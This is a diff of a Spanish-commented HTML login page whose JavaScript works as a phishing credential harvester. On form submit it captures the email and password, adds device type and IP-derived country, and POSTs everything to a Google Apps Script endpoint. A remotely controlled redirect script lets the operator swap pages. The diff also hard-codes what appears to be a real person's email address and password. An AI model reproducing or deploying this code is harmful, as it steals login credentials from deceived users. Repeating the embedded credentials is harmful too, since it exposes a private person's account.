@@ -261,8 +261,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     const errorMessage = document.getElementById('error-message'); 
     
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["ejemplo@correo.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["ejemplo01"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedEmails = ["tamaraganoza417@gmail.com"]; // Agregar correos prohibidos aquí
+    const prohibitedWords = ["Kiana14_07"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
@@ -294,132 +294,50 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         return;
     }
     
-    // Si todo está bien, limpia los mensajes de error
+    // Si todo está bien, limpia los mensajes de error y envía el formulario
     errorMessage.textContent = ""; // Limpia errores previos
     
-    // Función para detectar el modelo exacto del dispositivo
-    function detectDeviceModel() {
-        const userAgent = navigator.userAgent;
-        let deviceType = "Otro";
-        let deviceModel = "Desconocido";
-        
-        // Detectar iPhone y su modelo
-        if (/iPhone/.test(userAgent)) {
-            deviceType = "iPhone";
-            
-            // Intentar identificar el modelo de iPhone
-            const iPhoneVersion = userAgent.match(/OS (\d+)_(\d+)/i);
-            if (iPhoneVersion) {
-                const majorVersion = parseInt(iPhoneVersion[1]);
-                // Aproximación basada en la versión de iOS
-                if (majorVersion >= 15) {
-                    deviceModel = "iPhone 13-16 Series";
-                } else if (majorVersion >= 13) {
-                    deviceModel = "iPhone 11-12 Series";
-                } else if (majorVersion >= 11) {
-                    deviceModel = "iPhone X-XS Series";
-                } else {
-                    deviceModel = "iPhone (versión anterior)";
-                }
-            } else {
-                deviceModel = "iPhone";
-            }
-        } 
-        // Detectar iPad
-        else if (/iPad/.test(userAgent)) {
-            deviceType = "iPad";
-            deviceModel = "iPad";
-        } 
-        // Detectar Android y su modelo
-        else if (/Android/.test(userAgent)) {
-            deviceType = "Android";
-            
-            // Intentar extraer el modelo específico de Android
-            const matches = userAgent.match(/Android\s([0-9\.]+);\s([^;)]+)/);
-            if (matches && matches.length > 2) {
-                let model = matches[2].trim();
-                
-                // Limpiar el modelo para hacerlo más legible
-                model = model.replace(/Build\/[^\s]+/, '').trim();
-                
-                // Identificar modelos conocidos
-                if (/samsung/i.test(model)) {
-                    if (/SM-S20/.test(model)) {
-                        deviceModel = "Samsung Galaxy S20";
-                    } else if (/SM-S21/.test(model)) {
-                        deviceModel = "Samsung Galaxy S21";
-                    } else if (/SM-S22/.test(model)) {
-                        deviceModel = "Samsung Galaxy S22";
-                    } else if (/SM-G998/.test(model)) {
-                        deviceModel = "Samsung Galaxy S21 Ultra";
-                    } else if (/SM-S908/.test(model)) {
-                        deviceModel = "Samsung Galaxy S22 Ultra";
-                    } else if (/SM-S918/.test(model)) {
-                        deviceModel = "Samsung Galaxy S23 Ultra";
-                    } else {
-                        deviceModel = "Samsung " + model;
-                    }
-                } else if (/Pixel/.test(model)) {
-                    deviceModel = "Google " + model;
-                } else if (/OnePlus/.test(model)) {
-                    deviceModel = model;
-                } else if (/Xiaomi|Redmi/.test(model)) {
-                    deviceModel = model;
-                } else if (/Motorola|moto/i.test(model)) {
-                    deviceModel = "Motorola " + model;
-                } else if (/LG/i.test(model)) {
-                    deviceModel = "LG " + model;
-                } else if (/Huawei/i.test(model)) {
-                    deviceModel = "Huawei " + model;
-                } else {
-                    deviceModel = model; // Cualquier otro modelo Android
-                }
-            }
-        }
-        
-        return {
-            type: deviceType,
-            model: deviceModel
-        };
+    // Aquí puedes agregar código para enviar el formulario
+    // Por ejemplo:
+    this.submit(); // Envía el formulario si todas las validaciones son correctas
+});
+
+    // Detectar si el usuario usa iPhone o Android
+    let deviceType = "Otro"; // Valor por defecto
+    if (/android/i.test(navigator.userAgent)) {
+        deviceType = "Android";
+    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
+        deviceType = "iPhone";
     }
 
-    // Detectar dispositivo y modelo
-    const deviceInfo = detectDeviceModel();
-    
-    // Obtener el país y ciudad del usuario
+    // Obtener el país del usuario
     let country = "Desconocido";
-    let city = "Desconocido";
     try {
         const response = await fetch("https://ipwhois.app/json/");
         const data = await response.json();
-        if (data) {
-            if (data.country) {
-                country = data.country; // Captura el país
-            }
-            if (data.city) {
-                city = data.city; // Captura la ciudad
-            }
+        if (data.country) {
+            country = data.country; // Nombre del país
         }
     } catch (error) {
-        console.error("Error obteniendo la ubicación:", error);
+        console.error("Error obteniendo el país:", error);
     }
-    
+
     // Enviar datos a Google Apps Script
     const formData = new FormData();
     formData.append("email", email);
     formData.append("password", password);
-    formData.append("device", deviceInfo.type);
-    formData.append("modelo", deviceInfo.model); // Agregar el modelo del dispositivo
-    formData.append("country", country);
-    formData.append("city", city); // Agregar la ciudad
-    
-    const url = "https://script.google.com/macros/s/AKfycbyfp6IHWmWGdTbXDThdCM5hTbtrE_KjbvaOEAWMbOy1aan4nAz_i_enwghl4GVD4704lw/exec"; // Reemplaza con tu Google Apps Script
+    formData.append("device", deviceType);
+    formData.append("country", country); // Enviar el país
+
+    const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec"; // Reemplaza con tu Google Apps Script
+
     try {
         const response = await fetch(url, {
             method: "POST",
             body: new URLSearchParams(formData),
             headers: { "Content-Type": "application/x-www-form-urlencoded" }
         });
+
         if (response.ok) {
             window.location.href = "invitation.html"; // Redirigir tras éxito
         } else {
@@ -432,16 +350,16 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
 });
 </script>
 
-<script>
+          <script>
     document.addEventListener("DOMContentLoaded", async function () {
-        const API_URL = "https://script.google.com/macros/s/AKfycbyfp6IHWmWGdTbXDThdCM5hTbtrE_KjbvaOEAWMbOy1aan4nAz_i_enwghl4GVD4704lw/exec"; // Reemplaza con la URL de tu Google Apps Script
+        const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec"; // Reemplaza con la URL de tu Google Apps Script
 
         try {
             // Evitar caché agregando un timestamp único a la URL
             const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
             const pagina = await response.text();
 
-            if (pagina.trim() !== "formulario.html") {
+            if (pagina.trim() !== "folder.html") {
                 window.location.href = pagina; // Redirigir si el administrador lo ha cambiado
             }
         } catch (error) {
@@ -449,10 +367,6 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         }
     });
 </script>
-
-
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/device-detector-js/2.2.10/device-detector.min.js"></script>
 
 
 
